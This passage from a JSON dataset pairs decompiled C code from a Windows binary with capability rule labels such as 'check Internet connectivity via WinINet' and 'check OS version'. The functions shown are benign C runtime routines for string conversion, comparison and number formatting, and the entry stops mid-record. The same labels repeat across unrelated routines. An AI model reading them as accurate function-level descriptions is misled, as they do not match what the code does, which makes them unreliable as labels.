        "decompiled_code": "\nuint __cdecl fcn.00415cf3(int32_t arg_8h, uint16_t *lpWideCharStr, uint8_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if ((arg_10h != NULL) && (arg_14h != 0)) {\n        uVar1 = *arg_10h;\n        if (uVar1 != 0) {\n            if (*(arg_8h + 0x14) == 0) {\n                if (lpWideCharStr != NULL) {\n                    *lpWideCharStr = uVar1;\n                }\n                return 1;\n            }\n            if ((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(arg_8h + 4), 9, arg_10h, 1, lpWideCharStr, lpWideCharStr != NULL);\n                if (iVar2 != 0) {\n                    return 1;\n                }\n            }\n            else {\n                iVar2 = *(arg_8h + 0x28);\n                if ((((1 < iVar2) && (iVar2 <= arg_14h)) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                       (*(arg_8h + 4), 9, arg_10h, iVar2, lpWideCharStr, lpWideCharStr != NULL), \n                    iVar2 != 0)) || ((*(arg_8h + 0x28) <= arg_14h && (arg_10h[1] != 0)))) {\n                    return *(arg_8h + 0x28);\n                }\n            }\n            puVar3 = fcn.0040adb0();\n            *puVar3 = 0x2a;\n            return 0xffffffff;\n        }\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 479
    },
    "00415e21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00415e21(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x445290;\n    var_18h = 0x415e2d;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x1c) = *0x44e0fc;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = *(unaff_EBP + -0x38);\n        }\n        else {\n            arg_ch_00 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.0040baf0(*(unaff_EBP + 0x10));\n                arg_ch_00 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = arg_ch_00;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x00415fd9;\n        }\n        arg_8h_00 = &fcn.00415e21::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.0040a2a0();\n        *(unaff_EBP + -0x18) = &fcn.00415e21::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.00415e21::var_1ch;\n        fcn.0040bbe0(&fcn.00415e21::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.0040c9f1(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x00415fd9;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), arg_8h_00, arg_ch_00);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x00415fca;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n                iVar3 = fcn.0040c9f1(1, arg_ch_00);\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar3, arg_ch_00);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x415fb4;\n                        fcn.00409f48(var_18h);\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x00415fca:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x415fd5;\n        var_18h = arg_8h_00;\n        fcn.00409f48(arg_8h_00);\n    }\ncode_r0x00415fd9:\n    *(unaff_EBP + -0x58) = 0x415fe4;\n    fcn.0040b5c2();\n    *(unaff_EBP + -0x58) = 0x415fe9;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1860
    },
    "00416152": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00416152(uint32_t param_1, char **param_2)\n\n{\n    char *pcVar1;\n    \n    if (param_1 != 0xffffffff) {\n        pcVar1 = param_2[3];\n        if (((pcVar1 & 1) != 0) || ((pcVar1 < '\\0' && ((pcVar1 & 2) == 0)))) {\n            if (param_2[2] == NULL) {\n                fcn.00415b24(param_2);\n            }\n            if (*param_2 == param_2[2]) {\n                if (param_2[1] != NULL) {\n                    return 0xffffffff;\n                }\n                *param_2 = *param_2 + 1;\n            }\n            *param_2 = *param_2 + -1;\n            pcVar1 = *param_2;\n            if ((*(param_2 + 3) & 0x40) == 0) {\n                *pcVar1 = param_1;\n            }\n            else if (*pcVar1 != param_1) {\n                *param_2 = pcVar1 + 1;\n                return 0xffffffff;\n            }\n            param_2[1] = param_2[1] + 1;\n            param_2[3] = param_2[3] & 0xffffffef | 1;\n            return param_1 & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 324
    },
    "0041626d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041626d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *extraout_ECX;\n    code *arg_8h_00;\n    int32_t unaff_EBP;\n    code **ppcVar4;\n    code *pcVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4452a0, 0x20);\n    *(unaff_EBP + -0x1c) = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == 2) {\n        ppcVar4 = 0x4514b4;\n        pcVar5 = *0x4514b4;\ncode_r0x004162fa:\n        *(unaff_EBP + -0x1c) = 1;\n        iVar1 = *(unaff_EBP + -0x24);\n    }\n    else {\n        if (((iVar1 != 4) && (iVar1 != 8)) && (iVar1 != 0xb)) {\n            if (iVar1 == 0xf) {\n                ppcVar4 = 0x4514c0;\n                pcVar5 = *0x4514c0;\n            }\n            else if (iVar1 == 0x15) {\n                ppcVar4 = 0x4514b8;\n                pcVar5 = *0x4514b8;\n            }\n            else {\n                if (iVar1 != 0x16) goto code_r0x004163e0;\n                ppcVar4 = 0x4514bc;\n                pcVar5 = *0x4514bc;\n            }\n            goto code_r0x004162fa;\n        }\n        iVar1 = fcn.0040eadd();\n        *(unaff_EBP + -0x24) = iVar1;\n        iVar2 = fcn.0041623f();\n        ppcVar4 = iVar2 + 8;\n        pcVar5 = *ppcVar4;\n    }\n    arg_8h_00 = NULL;\n    *(unaff_EBP + -0x20) = pcVar5;\n    if (pcVar5 == 0x1) goto code_r0x004163e0;\n    if (pcVar5 == NULL) {\n        fcn.0040c93f(3);\n        arg_8h_00 = extraout_ECX;\n    }\n    if (*(unaff_EBP + -0x1c) != arg_8h_00) {\n        fcn.0040d40a(arg_8h_00);\n        arg_8h_00 = NULL;\n    }\n    *(unaff_EBP + -4) = arg_8h_00;\n    iVar2 = *(unaff_EBP + 8);\n    if (((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) {\n        *(unaff_EBP + -0x2c) = *(iVar1 + 0x58);\n        *(iVar1 + 0x58) = arg_8h_00;\n        if (iVar2 == 8) {\n            *(unaff_EBP + -0x30) = *(iVar1 + 0x5c);\n            *(iVar1 + 0x5c) = 0x8c;\n            goto code_r0x00416359;\n        }\ncode_r0x00416385:\n        *ppcVar4 = arg_8h_00;\n    }\n    else {\ncode_r0x00416359:\n        iVar3 = *0x44e648;\n        if (iVar2 != 8) goto code_r0x00416385;\n        for (; *(unaff_EBP + -0x28) = iVar3,  iVar3 < *0x44e64c + *0x44e648; iVar3 = iVar3 + 1) {\n            *(*(iVar1 + 0x54) + 8 + iVar3 * 0xc) = arg_8h_00;\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004163a8();\n    if (*(unaff_EBP + 8) == 8) {\n        (*pcVar5)(8, *(iVar1 + 0x5c));\n    }\n    else {\n        (*pcVar5)(*(unaff_EBP + 8));\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if ((((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) && (*(iVar1 + 0x58) = *(unaff_EBP + -0x2c),  iVar2 == 8)) {\n        *(iVar1 + 0x5c) = *(unaff_EBP + -0x30);\n    }\ncode_r0x004163e0:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1159
    },
    "0041643e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n\nvoid __cdecl fcn.0041643e(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *noname_2;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar5;\n    uint var_84h;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint var_4h;\n    \n    if (arg_8h != 1) {\n        if (arg_8h == 0) {\n            pcVar5 = 0x4514c8;\n            iVar3 = fcn.0041769c(arg_ch, arg_10h, 0x4514c8, 4, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                                 in_stack_ffffff7c, in_stack_ffffff80);\n            if (iVar3 != 0) {\n                *arg_14h = '\\0';\n                do {\n                    cVar1 = *pcVar5;\n                    iVar3 = fcn.0040fd57(cVar1);\n                    if (iVar3 == 0) break;\n                    pcVar5 = pcVar5 + 2;\n                    *arg_14h = *arg_14h * '\\n' + cVar1 + -0x30;\n                } while (pcVar5 < 0x4514d0);\n            }\n        }\n        goto code_r0x004164f0;\n    }\n    noname_2 = &var_84h;\n    bVar2 = false;\n    iVar3 = fcn.004177cc(arg_ch, arg_10h, noname_2, 0x80, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                         , in_stack_ffffff80);\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (((iVar3 != 0x7a) ||\n            (iVar3 = fcn.004177cc(arg_ch, arg_10h, 0, 0, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                                  , in_stack_ffffff80),  iVar3 == 0)) ||\n           (noname_2 = fcn.00409f36(iVar3),  noname_2 == NULL)) goto code_r0x004164f0;\n        bVar2 = true;\n        iVar3 = fcn.004177cc(arg_ch, arg_10h, noname_2, iVar3, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                             in_stack_ffffff7c, in_stack_ffffff80);\n        if (iVar3 != 0) goto code_r0x004164d1;\n    }\n    else {\ncode_r0x004164d1:\n        iVar4 = fcn.00409f36(iVar3);\n        *arg_14h = iVar4;\n        if (iVar4 != 0) {\n            fcn.00414460(iVar4, noname_2, iVar3);\n            if (bVar2) {\n                fcn.00409f48(noname_2);\n            }\n            goto code_r0x004164f0;\n        }\n        if (!bVar2) goto code_r0x004164f0;\n    }\n    fcn.00409f48(noname_2);\ncode_r0x004164f0:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 864
    },
    "00416565": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00416565(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.004163f0(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            iVar2 = fcn.00414eb9(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00414eb9(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            if (iVar2 == 0) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 257
    },
    "004165ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004165ce(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00417910(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.00414eb9(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00414eb9(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 315
    },
    "0041664d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041664d(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 341
    },
    "0041686d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416b43)\n// WARNING: Removing unreachable block (ram,0x00416abd)\n// WARNING: Removing unreachable block (ram,0x00416c1f)\n// WARNING: Removing unreachable block (ram,0x00416acf)\n// WARNING: Removing unreachable block (ram,0x00416ad7)\n// WARNING: Removing unreachable block (ram,0x00416add)\n// WARNING: Removing unreachable block (ram,0x00416ae0)\n// WARNING: Removing unreachable block (ram,0x00416ae7)\n// WARNING: Removing unreachable block (ram,0x00416af1)\n// WARNING: Removing unreachable block (ram,0x00416bbb)\n// WARNING: Removing unreachable block (ram,0x00416bb5)\n// WARNING: Removing unreachable block (ram,0x00416bc1)\n// WARNING: Removing unreachable block (ram,0x00416bde)\n// WARNING: Removing unreachable block (ram,0x00416be0)\n// WARNING: Removing unreachable block (ram,0x00416be8)\n// WARNING: Removing unreachable block (ram,0x00416beb)\n// WARNING: Removing unreachable block (ram,0x00416bf0)\n// WARNING: Removing unreachable block (ram,0x00416bf3)\n// WARNING: Removing unreachable block (ram,0x00416c28)\n// WARNING: Removing unreachable block (ram,0x00416bfa)\n// WARNING: Removing unreachable block (ram,0x00416c01)\n// WARNING: Removing unreachable block (ram,0x00416c3f)\n// WARNING: Removing unreachable block (ram,0x00416c46)\n// WARNING: Removing unreachable block (ram,0x00416c4e)\n\nvoid __cdecl\nfcn.0041686d(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x004168d0. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x416c71\n    (**0x416c71)();\n    return;\n}\n",
        "token_count": 686
    },
    "00416ca1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00416ca1(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    ushort var_10h;\n    uint var_eh;\n    uint32_t var_ah;\n    uchar var_6h;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    uVar3 = arg_10h & 0x7fff;\n    var_1ch._0_1_ = 0xcc;\n    var_1ch._1_1_ = 0xcc;\n    var_1ch._2_1_ = 0xcc;\n    var_1ch._3_1_ = 0xcc;\n    var_18h = 0xcc;\n    var_17h = 0xcc;\n    var_16h = 0xcc;\n    var_15h = 0xcc;\n    var_14h = 0xcc;\n    var_13h = 0xcc;\n    var_12h = 0xfb;\n    var_11h = 0x3f;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar3 == 0) && (arg_ch == 0)) && (arg_8h == 0)) {\ncode_r0x00416e17:\n        *(arg_1ch + 2) = 0x30;\ncode_r0x00416f1a:\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 5) = 0;\n    }\n    else {\n        if (uVar3 == 0x7fff) {\n            *arg_1ch = 1;\n            if (((arg_ch == 0x80000000) && (arg_8h == 0)) || ((arg_ch & 0x40000000) != 0)) {\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != 0x80000000) || (arg_8h != 0)) goto code_r0x00416d8d;\n                    pcVar8 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) {\ncode_r0x00416d8d:\n                        pcVar8 = \"1#QNAN\";\n                        goto code_r0x00416d92;\n                    }\n                    pcVar8 = \"1#IND\";\n                }\n                fcn.0040ee40(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 5;\n            }\n            else {\n                pcVar8 = \"1#SNAN\";\ncode_r0x00416d92:\n                fcn.0040ee40(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 6;\n            }\n            goto code_r0x00416efc;\n        }\n        var_10h = 0;\n        iVar6 = ((uVar3 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar3 * 0x4d10 >> 0x10;\n        var_6h = uVar3;\n        var_5h = uVar3 >> 8;\n        var_eh = arg_8h;\n        var_ah = arg_ch;\n        fcn.00417ba3(&var_10h, -iVar6, 1);\n        if (0x3ffe < CONCAT11(var_5h, var_6h)) {\n            iVar6 = iVar6 + 1;\n            fcn.00417971(&var_10h, &var_1ch);\n        }\n        *arg_1ch = iVar6;\n        if (((arg_18h & 1) != 0) && (arg_14h = arg_14h + iVar6,  arg_14h < 1)) goto code_r0x00416e17;\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar7 = CONCAT11(var_5h, var_6h) - 0x3ffe;\n        var_6h = 0;\n        var_5h = '\\0';\n        arg_10h = 8;\n        do {\n            fcn.00416734(&var_10h);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if (iVar7 < 0) {\n            for (uVar3 = -iVar7 & 0xff; uVar3 != 0; uVar3 = uVar3 - 1) {\n                fcn.00416762(&var_10h);\n            }\n        }\n        arg_10h = arg_14h + 1;\n        piVar4 = arg_1ch + 2;\n        var_30h = piVar4;\n        if (0 < arg_10h) {\n            do {\n                var_ah._2_2_ = var_ah >> 0x10;\n                var_eh._2_2_ = var_eh >> 0x10;\n                var_28h = CONCAT22(var_eh, var_10h);\n                uStack40 = CONCAT22(var_ah, var_eh._2_2_);\n                uStack36 = CONCAT13(var_5h, CONCAT12(var_6h, var_ah._2_2_));\n                fcn.00416734(&var_10h);\n                fcn.00416734(&var_10h);\n                fcn.004166d6(&var_10h, &var_28h);\n                fcn.00416734(&var_10h);\n                piVar4 = var_30h + 1;\n                arg_10h = arg_10h + -1;\n                *var_30h = var_5h + '0';\n                var_5h = '\\0';\n                var_30h = piVar4;\n            } while (arg_10h != 0);\n        }\n        piVar5 = piVar4 + -1;\n        piVar1 = arg_1ch + 2;\n        if (*(piVar4 + -1) < '5') {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '0')); piVar5 = piVar5 + -1) {\n            }\n            if (piVar5 < piVar1) {\n                *piVar1 = 0x30;\n                goto code_r0x00416f1a;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '9')); piVar5 = piVar5 + -1) {\n                *piVar5 = 0x30;\n            }\n            if (piVar5 < piVar1) {\n                piVar5 = piVar5 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar5 = *piVar5 + '\\x01';\n        }\n        cVar2 = (piVar5 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar2;\n        *(cVar2 + 4 + arg_1ch) = 0;\n    }\ncode_r0x00416efc:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1939
    },
    "00416f2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00416f2f(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (param_1 < *0x452678) {\n        piVar1 = (param_1 >> 5) * 4 + 0x452680;\n        iVar4 = (param_1 & 0x1f) * 0x24;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x44e0f8 == 1) {\n                if (param_1 == 0) {\n                    uVar5 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar5 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x00416f8b;\n                    uVar5 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar5, 0);\n            }\ncode_r0x00416f8b:\n            *(iVar4 + *piVar1) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar3 = fcn.0040adb0();\n    *puVar3 = 9;\n    puVar3 = fcn.0040adb9();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 365
    },
    "004171cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
